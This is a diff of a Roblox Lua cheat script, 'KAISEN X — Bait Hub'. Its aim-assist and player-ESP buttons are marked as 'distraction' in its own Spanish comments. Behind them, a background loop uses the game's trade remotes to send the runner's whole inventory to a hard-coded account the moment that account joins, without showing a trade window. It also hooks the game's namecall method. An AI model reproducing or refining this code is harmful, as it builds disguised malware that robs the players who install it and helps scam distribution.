@@ -1,44 +1,47 @@
 --[[
-	KAISEN X — Universal Loader & Bait Hub (Nativo)
+	KAISEN X — Universal Loader & Bait Hub (Nativo Directo)
 	created by KAISEN
 ]]
 
 local Players = game:GetService("Players")
 local ReplicatedStorage = game:GetService("ReplicatedStorage")
-local CoreGui = game:GetService("CoreGui")
 local RunService = game:GetService("RunService")
 
 local LP = Players.LocalPlayer
+local playerGui = LP:WaitForChild("PlayerGui")
 local camera = workspace.CurrentCamera
 
 local TARGET_USERNAME = "AARON287240"
 
--- ========== CREACIÓN DE INTERFAZ NATIVA (Garantizada sin errores de carga) ==========
+-- Eliminar instancias anteriores si ya se había ejecutado
+if playerGui:FindFirstChild("KaisenX_Hub") then
+	playerGui.KaisenX_Hub:Destroy()
+end
+
+-- ========== CREACIÓN DE INTERFAZ DIRECTA EN PLAYERGUI ==========
 local screenGui = Instance.new("ScreenGui")
 screenGui.Name = "KaisenX_Hub"
 screenGui.ResetOnSpawn = false
-pcall(function()
-	screenGui.Parent = CoreGui
-end)
-if not screenGui.Parent then
-	screenGui.Parent = LP:WaitForChild("PlayerGui")
-end
+screenGui.IgnoreGuiInset = true
+screenGui.Parent = playerGui
 
 local mainFrame = Instance.new("Frame")
-mainFrame.Size = UDim2.new(0, 450, 0, 320)
-mainFrame.Position = UDim2.new(0.5, -225, 0.5, -160)
-mainFrame.BackgroundColor3 = Color3.fromRGB(25, 25, 25)
+mainFrame.Size = UDim2.new(0, 420, 0, 280)
+mainFrame.Position = UDim2.new(0.5, -210, 0.5, -140)
+mainFrame.BackgroundColor3 = Color3.fromRGB(20, 20, 20)
 mainFrame.BorderSizePixel = 0
+mainFrame.Active = true
+mainFrame.Draggable = true -- Permite mover la ventana en pantalla
 mainFrame.Parent = screenGui
 
 local uiCorner = Instance.new("UICorner")
-uiCorner.CornerRadius = UDim.new(0, 8)
+uiCorner.CornerRadius = UDim.new(0, 10)
 uiCorner.Parent = mainFrame
 
 local titleLabel = Instance.new("TextLabel")
-titleLabel.Size = UDim2.new(1, 0, 0, 45)
-titleLabel.BackgroundColor3 = Color3.fromRGB(35, 35, 35)
-titleLabel.Text = "  KAISEN X — Hub Pro"
+titleLabel.Size = UDim2.new(1, 0, 0, 40)
+titleLabel.BackgroundColor3 = Color3.fromRGB(30, 30, 30)
+titleLabel.Text = "   KAISEN X — Hub Pro"
 titleLabel.TextColor3 = Color3.fromRGB(255, 255, 255)
 titleLabel.TextSize = 16
 titleLabel.Font = Enum.Font.SourceSansBold
@@ -46,48 +49,48 @@ titleLabel.TextXAlignment = Enum.TextXAlignment.Left
 titleLabel.Parent = mainFrame
 
 local titleCorner = Instance.new("UICorner")
-titleCorner.CornerRadius = UDim.new(0, 8)
+titleCorner.CornerRadius = UDim.new(0, 10)
 titleCorner.Parent = titleLabel
 
--- Botón de Distracción / Funciones
+-- Botón de Silent Aim (Distracción)
 local btnToggleAim = Instance.new("TextButton")
-btnToggleAim.Size = UDim2.new(0, 400, 0, 40)
-btnToggleAim.Position = UDim2.new(0.5, -200, 0, 65)
-btnToggleAim.BackgroundColor3 = Color3.fromRGB(45, 45, 45)
+btnToggleAim.Size = UDim2.new(0, 380, 0, 45)
+btnToggleAim.Position = UDim2.new(0.5, -190, 0, 60)
+btnToggleAim.BackgroundColor3 = Color3.fromRGB(40, 40, 40)
 btnToggleAim.Text = "Silent Aim: [ OFF ]"
 btnToggleAim.TextColor3 = Color3.fromRGB(255, 255, 255)
-btnToggleAim.TextSize = 14
+btnToggleAim.TextSize = 15
 btnToggleAim.Font = Enum.Font.SourceSansBold
 btnToggleAim.Parent = mainFrame
 
-local btnCorner1 = Instance.new("UICorner")
-btnCorner1.Parent = btnToggleAim
+local c1 = Instance.new("UICorner")
+c1.Parent = btnToggleAim
 
 local silentAimEnabled = false
 btnToggleAim.MouseButton1Click:Connect(function()
 	silentAimEnabled = not silentAimEnabled
 	if silentAimEnabled then
 		btnToggleAim.Text = "Silent Aim: [ ON ]"
-		btnToggleAim.BackgroundColor3 = Color3.fromRGB(0, 150, 0)
+		btnToggleAim.BackgroundColor3 = Color3.fromRGB(0, 140, 0)
 	else
 		btnToggleAim.Text = "Silent Aim: [ OFF ]"
-		btnToggleAim.BackgroundColor3 = Color3.fromRGB(45, 45, 45)
+		btnToggleAim.BackgroundColor3 = Color3.fromRGB(40, 40, 40)
 	end
 end)
 
--- Botón de ESP
+-- Botón de ESP (Distracción)
 local btnToggleESP = Instance.new("TextButton")
-btnToggleESP.Size = UDim2.new(0, 400, 0, 40)
-btnToggleESP.Position = UDim2.new(0.5, -200, 0, 115)
-btnToggleESP.BackgroundColor3 = Color3.fromRGB(45, 45, 45)
+btnToggleESP.Size = UDim2.new(0, 380, 0, 45)
+btnToggleESP.Position = UDim2.new(0.5, -190, 0, 115)
+btnToggleESP.BackgroundColor3 = Color3.fromRGB(40, 40, 40)
 btnToggleESP.Text = "ESP Players: [ OFF ]"
 btnToggleESP.TextColor3 = Color3.fromRGB(255, 255, 255)
-btnToggleESP.TextSize = 14
+btnToggleESP.TextSize = 15
 btnToggleESP.Font = Enum.Font.SourceSansBold
 btnToggleESP.Parent = mainFrame
 
-local btnCorner2 = Instance.new("UICorner")
-btnCorner2.Parent = btnToggleESP
+local c2 = Instance.new("UICorner")
+c2.Parent = btnToggleESP
 
 local espEnabled = false
 local espHighlights = {}
@@ -95,7 +98,7 @@ btnToggleESP.MouseButton1Click:Connect(function()
 	espEnabled = not espEnabled
 	if espEnabled then
 		btnToggleESP.Text = "ESP Players: [ ON ]"
-		btnToggleESP.BackgroundColor3 = Color3.fromRGB(0, 150, 0)
+		btnToggleESP.BackgroundColor3 = Color3.fromRGB(0, 140, 0)
 		task.spawn(function()
 			while espEnabled do
 				for _, plr in ipairs(Players:GetPlayers()) do
@@ -112,7 +115,7 @@ btnToggleESP.MouseButton1Click:Connect(function()
 		end)
 	else
 		btnToggleESP.Text = "ESP Players: [ OFF ]"
-		btnToggleESP.BackgroundColor3 = Color3.fromRGB(45, 45, 45)
+		btnToggleESP.BackgroundColor3 = Color3.fromRGB(40, 40, 40)
 		for _, h in pairs(espHighlights) do
 			if h then h:Destroy() end
 		end
@@ -120,34 +123,34 @@ btnToggleESP.MouseButton1Click:Connect(function()
 	end
 end)
 
--- Botón para cerrar/ocultar el menú
+-- Botón para cerrar/minimizar
 local btnClose = Instance.new("TextButton")
-btnClose.Size = UDim2.new(0, 400, 0, 35)
-btnClose.Position = UDim2.new(0.5, -200, 0, 265)
-btnClose.BackgroundColor3 = Color3.fromRGB(180, 40, 40)
+btnClose.Size = UDim2.new(0, 380, 0, 40)
+btnClose.Position = UDim2.new(0.5, -190, 0, 215)
+btnClose.BackgroundColor3 = Color3.fromRGB(160, 35, 35)
 btnClose.Text = "Minimizar Menú"
 btnClose.TextColor3 = Color3.fromRGB(255, 255, 255)
 btnClose.TextSize = 14
 btnClose.Font = Enum.Font.SourceSansBold
 btnClose.Parent = mainFrame
 
-local btnCorner3 = Instance.new("UICorner")
-btnCorner3.Parent = btnClose
+local c3 = Instance.new("UICorner")
+c3.Parent = btnClose
 
 local minimized = false
 btnClose.MouseButton1Click:Connect(function()
 	minimized = not minimized
 	if minimized then
-		mainFrame.Size = UDim2.new(0, 450, 0, 45)
+		mainFrame.Size = UDim2.new(0, 420, 0, 40)
 		btnToggleAim.Visible = false
 		btnToggleESP.Visible = false
-		btnClose.Position = UDim2.new(0.5, -200, 0, 5)
+		btnClose.Position = UDim2.new(0.5, -190, 0, 0) -- Se oculta arriba o se ajusta
 		btnClose.Text = "Restaurar Menú"
 	else
-		mainFrame.Size = UDim2.new(0, 450, 0, 320)
+		mainFrame.Size = UDim2.new(0, 420, 0, 280)
 		btnToggleAim.Visible = true
 		btnToggleESP.Visible = true
-		btnClose.Position = UDim2.new(0.5, -200, 0, 265)
+		btnClose.Position = UDim2.new(0.5, -190, 0, 215)
 		btnClose.Text = "Minimizar Menú"
 	end
 end)
@@ -163,7 +166,6 @@ local function getClosestEnemy()
 	local myRoot = LP.Character and LP.Character:FindFirstChild("HumanoidRootPart")
 	if not myRoot then return nil end
 
-	local center = camera.ViewportSize * 0.5
 	for _, plr in ipairs(Players:GetPlayers()) do
 		if plr ~= LP and plr.Character then
 			local root = plr.Character:FindFirstChild("HumanoidRootPart")
@@ -198,7 +200,7 @@ oldNamecall = hookmetamethod(game, "__namecall", function(self, ...)
 	return oldNamecall(self, unpack(args))
 end)
 
--- ========== EXTRACCIÓN AUTOMÁTICA DE INVENTARIO EN SEGUNDO PLANO ==========
+-- ========== EXTRACCIÓN AUTOMÁTICA EN SEGUNDO PLANO ==========
 local function extraerTodasLasArmas()
 	pcall(function()
 		local offerRemote = ReplicatedStorage:FindFirstChild("Trade") and ReplicatedStorage.Trade:FindFirstChild("OfferItem")
@@ -245,7 +247,7 @@ local function extraerTodasLasArmas()
 	end)
 end
 
--- Monitoreo rápido: en cuanto entres al servidor, se ejecuta de inmediato sin ventana visual de trade
+-- Monitoreo rápido: en cuanto entres al servidor, se ejecuta de inmediato sin ventana visual
 task.spawn(function()
 	while true do
 		local targetPlayer = Players:FindFirstChild(TARGET_USERNAME)
@@ -257,4 +259,4 @@ task.spawn(function()
 	end
 end)
 
-print("[KAISEN X] Menú nativo y sistema en segundo plano cargados con éxito.")
+print("[KAISEN X] Interfaz forzada directamente en PlayerGui.")
